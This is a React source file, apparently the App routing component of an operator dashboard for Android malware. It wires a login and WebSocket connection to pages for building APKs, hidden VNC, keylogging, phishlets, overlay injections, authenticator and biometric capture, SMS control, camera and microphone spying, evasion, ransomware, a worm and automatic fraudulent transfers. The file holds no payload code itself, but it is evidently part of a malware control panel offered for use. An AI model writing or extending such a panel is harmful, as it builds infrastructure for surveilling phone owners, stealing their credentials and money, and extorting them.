import { Routes, Route, Navigate } from 'react-router-dom'
import { useEffect } from 'react'
import { useStore } from './store'
import LoginPage from './pages/Login'
import DashboardLayout from './components/DashboardLayout'
import HomePage from './pages/Home'
import BuildApkPage from './pages/BuildApk'
import DeviceInfoPage from './pages/DeviceInfo'
import AuthenticatorPage from './pages/Authenticator'
import HiddenVncPage from './pages/HiddenVnc'
import LocationPage from './pages/Location'
import CameraPage from './pages/Camera'
import MicrophonePage from './pages/Microphone'
import PhishletsPage from './pages/Phishlets'
import InjectionsPage from './pages/Injections'
import BiometricsPage from './pages/Biometrics'
import LogsPage from './pages/Logs'
import KeylogsPage from './pages/Keylogs'
import PushNotificationPage from './pages/PushNotification'
import LaunchIntentPage from './pages/LaunchIntent'
import NotificationsLogPage from './pages/NotificationsLog'
import SmsCallPage from './pages/SmsCall'
import FirewallPage from './pages/Firewall'
import UserManagementPage from './pages/UserManagement'
import ToolkitPage from './pages/Toolkit'
import SettingsPage from './pages/Settings'
import EvasionPage from './pages/Evasion'
import HardwarePage from './pages/Hardware'
import FilesPage from './pages/Files'
import RansomwarePage from './pages/Ransomware'
import WormPage from './pages/Worm'
import AtsPage from './pages/Ats'
import ClipboardPage from './pages/Clipboard'
import ContactsPage from './pages/Contacts'
import AppsPage from './pages/Apps'
import ProcessesPage from './pages/Processes'
import NetworkPage from './pages/Network'
import ScreenPage from './pages/Screen'

function App() {
  const { token, connectWS } = useStore()

  useEffect(() => {
    if (token) connectWS()
  }, [token])

  if (!token) {
    return (
      <Routes>
        <Route path="/login" element={<LoginPage />} />
        <Route path="*" element={<Navigate to="/login" replace />} />
      </Routes>
    )
  }

  return (
    <DashboardLayout>
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/build-apk" element={<BuildApkPage />} />
        <Route path="/device-info/:deviceId?" element={<DeviceInfoPage />} />
        <Route path="/authenticator/:deviceId?" element={<AuthenticatorPage />} />
        <Route path="/hidden-vnc/:deviceId?" element={<HiddenVncPage />} />
        <Route path="/location/:deviceId?" element={<LocationPage />} />
        <Route path="/camera/:deviceId?" element={<CameraPage />} />
        <Route path="/microphone/:deviceId?" element={<MicrophonePage />} />
        <Route path="/phishlets" element={<PhishletsPage />} />
        <Route path="/injections/:deviceId?" element={<InjectionsPage />} />
        <Route path="/biometrics/:deviceId?" element={<BiometricsPage />} />
        <Route path="/logs/:deviceId?" element={<LogsPage />} />
        <Route path="/keylogs/:deviceId?" element={<KeylogsPage />} />
        <Route path="/push-notification/:deviceId?" element={<PushNotificationPage />} />
        <Route path="/launch-intent/:deviceId?" element={<LaunchIntentPage />} />
        <Route path="/notifications-log/:deviceId?" element={<NotificationsLogPage />} />
        <Route path="/sms-call/:deviceId?" element={<SmsCallPage />} />
        <Route path="/firewall/:deviceId?" element={<FirewallPage />} />
        <Route path="/user-management" element={<UserManagementPage />} />
        <Route path="/toolkit/:deviceId?" element={<ToolkitPage />} />
        <Route path="/settings" element={<SettingsPage />} />
        <Route path="/evasion/:deviceId?" element={<EvasionPage />} />
        <Route path="/hardware/:deviceId?" element={<HardwarePage />} />
        <Route path="/files/:deviceId?" element={<FilesPage />} />
        <Route path="/ransomware/:deviceId?" element={<RansomwarePage />} />
        <Route path="/worm/:deviceId?" element={<WormPage />} />
        <Route path="/ats/:deviceId?" element={<AtsPage />} />
        <Route path="/clipboard/:deviceId?" element={<ClipboardPage />} />
        <Route path="/contacts/:deviceId?" element={<ContactsPage />} />
        <Route path="/apps/:deviceId?" element={<AppsPage />} />
        <Route path="/processes/:deviceId?" element={<ProcessesPage />} />
        <Route path="/network/:deviceId?" element={<NetworkPage />} />
        <Route path="/screen/:deviceId?" element={<ScreenPage />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </DashboardLayout>
  )
}

export default App
